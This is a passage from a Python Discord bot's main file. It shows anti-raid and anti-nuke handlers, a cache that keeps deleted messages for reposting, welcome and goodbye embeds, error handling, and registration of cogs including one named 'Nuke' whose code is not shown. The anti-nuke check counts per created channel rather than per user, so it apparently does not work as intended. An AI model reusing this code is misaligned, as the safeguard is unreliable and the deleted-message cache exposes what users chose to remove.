                await message.channel.send(f"🎉 {message.author.mention} đã lên level **{new_level}**!")

        # ===== ANTI-RAID =====
        if message.guild:
            anti_config = get_anticonfig(message.guild.id)
            if anti_config and anti_config.get("antiraid", False):
                user_id = message.author.id
                if user_id not in message_history:
                    message_history[user_id] = []
                message_history[user_id].append((time.time(), message.channel.id))
                raid_time = anti_config.get("raid_time", 5)
                cutoff = time.time() - raid_time
                message_history[user_id] = [t for t in message_history[user_id] if t[0] > cutoff]
                threshold = anti_config.get("raid_threshold", 5)
                if len(message_history[user_id]) > threshold:
                    log_channel_id = anti_config.get("log_channel")
                    if log_channel_id:
                        ch = bot.get_channel(log_channel_id)
                        if ch:
                            await ch.send(f"⚠️ **Anti-Raid triggered!** {message.author.mention} sent {len(message_history[user_id])} messages in {raid_time}s. Kicking...")
                    try:
                        await message.author.kick(reason="Auto-raid detection")
                    except:
                        pass
                    message_history[user_id] = []

        # ===== ANTI-NUKE =====
        if message.guild:
            anti_config = get_anticonfig(message.guild.id)
            if anti_config and anti_config.get("antinuke", False):
                async for entry in message.guild.audit_logs(limit=5, action=discord.AuditLogAction.channel_create):
                    try:
                        target_id = entry.target.id
                    except AttributeError:
                        continue
                    if target_id in channel_creation_history:
                        channel_creation_history[target_id].append((time.time(), entry.target.name))
                    else:
                        channel_creation_history[target_id] = [(time.time(), entry.target.name)]
                    if len(channel_creation_history[target_id]) > 5:
                        log_channel_id = anti_config.get("log_channel")
                        if log_channel_id:
                            ch = bot.get_channel(log_channel_id)
                            if ch:
                                await ch.send(f"⚠️ **Anti-Nuke triggered!** {entry.user.mention} created too many channels. Banning...")
                        try:
                            await entry.user.ban(reason="Auto-nuke detection")
                        except:
                            pass
                        channel_creation_history[target_id] = []
    except Exception as e:
        log(f"Lỗi trong on_message (nền): {e}", "ERROR")

    if message.content.startswith(PREFIX):
        try:
            await bot.process_commands(message)
        except Exception as e:
            log(f"Lỗi process_commands: {e}", "ERROR")
            await message.channel.send("❌ Đã xảy ra lỗi khi xử lý lệnh.")
@bot.event
async def on_message_delete(message):
    if message.author.bot:
        return
    snipe_cache[message.channel.id] = {
        "content": message.content,
        "author": message.author.display_name,
        "avatar": message.author.display_avatar.url,
        "time": utcnow()
    }

@bot.event
async def on_member_join(member):
    guild_data = data_manager.get_guild_data(member.guild.id)
    welcome_channel_id = guild_data.get("welcome_channel")
    if welcome_channel_id:
        channel = member.guild.get_channel(welcome_channel_id)
        if channel:
            embed = discord.Embed(
                title="👋 Welcome!",
                description=f"Chào mừng {member.mention} đến với {member.guild.name}!",
                color=0x00FF88,
                timestamp=utcnow()
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    guild_data = data_manager.get_guild_data(member.guild.id)
    goodbye_channel_id = guild_data.get("goodbye_channel")
    if goodbye_channel_id:
        channel = member.guild.get_channel(goodbye_channel_id)
        if channel:
            embed = discord.Embed(
                title="👋 Goodbye!",
                description=f"{member.display_name} đã rời khỏi server.",
                color=0xFF4444,
                timestamp=utcnow()
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            await channel.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"⏳ Wait {error.retry_after:.1f}s to reuse.", delete_after=5)
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send(f"❌ You need `{', '.join(error.missing_permissions)}` to use this command.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("❌ Invalid argument.")
    else:
        await ctx.send(f"❌ An error occurred: {str(error)}")
        print(error)

# ============================================================
# SETUP COGS
# ============================================================
async def setup():
    await bot.add_cog(Help(bot))
    await bot.add_cog(Nuke(bot))
    await bot.add_cog(Utility(bot))
    await bot.add_cog(Fun(bot))
    await bot.add_cog(EconomyCommands(bot))
    await bot.add_cog(LevelCommands(bot))
    await bot.add_cog(Anti(bot))
    await bot.add_cog(ServerList(bot))
    await bot.add_cog(Ticket(bot))

# ============================================================
# RUN BOT
# ============================================================
async def main():
    await setup()
    await bot.start(BOT_TOKEN)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped.")
    except Exception as e:
        print(f"[-] Error: {e}")
        input("Press Enter to exit...")
